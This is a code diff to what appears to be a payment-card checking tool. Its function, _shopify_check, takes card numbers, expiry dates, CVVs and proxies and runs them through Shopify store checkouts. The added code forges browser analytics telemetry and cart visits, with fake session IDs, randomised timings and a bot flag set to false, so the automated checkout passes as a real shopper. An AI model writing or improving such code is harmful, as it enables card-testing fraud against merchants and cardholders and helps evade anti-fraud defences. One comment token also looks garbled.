@@ -417,6 +417,58 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv, proxy_url=None):
             logger.info(f"[STEP3] ERROR: {str(e)[:60]}")
             return None, "Failed to add to cart", gw_name, None
         
+        # Send monorail telemetry (simulates real browser - needed for ARTIFACT_DISSATISFACTION)
+        try:
+            now_ms = int(time.time() * 1000)
+            monorail_url = f"{base_url}/.well-known/shopify/monorail/v1/produce"
+            monorail_payload = {
+                "schema_id": "perf_kit_on_interaction/3.2",
+                "payload": {
+                    "url": f"{base_url}/collections/all", "page_type": "product",
+                    "shop_id": 25603230, "application": "storefront-renderer",
+                    "session_token": str(uuid.uuid4()), "unique_token": str(uuid.uuid4()),
+                    "micro_session_id": str(uuid.uuid4()).upper(), "micro_session_count": 1,
+                    "interaction_to_next_paint": random.randint(30, 80),
+                    "seo_bot": False, "referrer": base_url,
+                    "worker_start": 0, "next_hop_protocol": "h3"
+                },
+                "metadata": {"event_created_at_ms": now_ms, "event_sent_at_ms": now_ms}
+            }
+            sess.post(monorail_url, json=monorail_payload, headers={'Content-Type': 'text/plain', 'Origin': base_url}, timeout=5)
+            
+            # Also send produce_batch
+            batch_url = f"{base_url}/.well-known/shopify/monorail/unstable/produce_batch"
+            batch_payload = {
+                "events": [{
+                    "schema_id": "storefront_customer_tracking/4.27",
+                    "payload": {
+                        "api_client_id": 580111, "event_id": f"sh-{str(uuid.uuid4()).upper()[:23]}",
+                        "event_name": "product_added_to_cart", "shop_id": 25603230,
+                        "total_value": 47, "currency": "USD", "event_time": now_ms,
+                        "event_source_url": base_url, "unique_token": str(uuid.uuid4()),
+                        "page_id": str(uuid.uuid4()).upper(), "source": "trekkie-storefront-renderer",
+                        "ccpa_enforced": True, "gdpr_enforced": False,
+                        "is_persistent_cookie": True, "analytics_allowed": True,
+                        "marketing_allowed": True, "sale_of_data_allowed": False,
+                        "preferences_allowed": True, "shopify_emitted": True,
+                    },
+                    "metadata": {"event_created_at_ms": now_ms}
+                }],
+                "metadata": {"event_sent_at_ms": now_ms}
+            }
+            sess.post(batch_url, json=batch_payload, headers={'Content-Type': 'text/plain', 'Origin': base_url}, timeout=5)
+            logger.info(f"[MONORAIL] sent")
+        except Exception as e:
+            logger.info(f"[MONORAIL] ERROR (non-fatal): {str(e)[:40]}")
+        
+        # View cart page (simulates browser navigation)
+        try:
+            sess.get(f"{base_url}/cart", headers={'Accept': 'text/html'}, timeout=5)
+            sess.get(f"{base_url}/cart.js", timeout=5)
+            logger.info(f"[CART] visited")
+        except:
+            pass
+        
         # Step 4: Start checkout from /cart
         try:
             r = sess.post(f"{base_url}/cart", data="updates%5B%5D=1&checkout=",
